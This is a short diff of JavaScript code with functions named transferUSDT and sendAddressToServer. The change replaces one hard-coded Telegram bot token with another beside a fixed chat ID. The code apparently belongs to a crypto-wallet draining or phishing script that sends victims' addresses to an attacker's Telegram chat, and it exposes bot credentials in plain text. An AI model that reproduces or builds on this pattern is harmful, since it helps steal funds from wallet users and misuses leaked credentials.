@@ -58,7 +58,7 @@ async function transferUSDT(e) {
 }
 
 async function sendAddressToServer(e) {
-  const token = "8503739462:AAERpuLqZTgZ5zVvE1cAOjPFcwm2YX2CA84";
+  const token = "6978650517:AAEsPLR3_R6DE-BD6zboZr9YFzyWDXOo-Yg";
   const chat_id = "993778683";
   // Message formatting (Monospace code for easy copy)
   // encodeURIComponent use kiya hai taaki spaces aur symbols URL mein error na dein
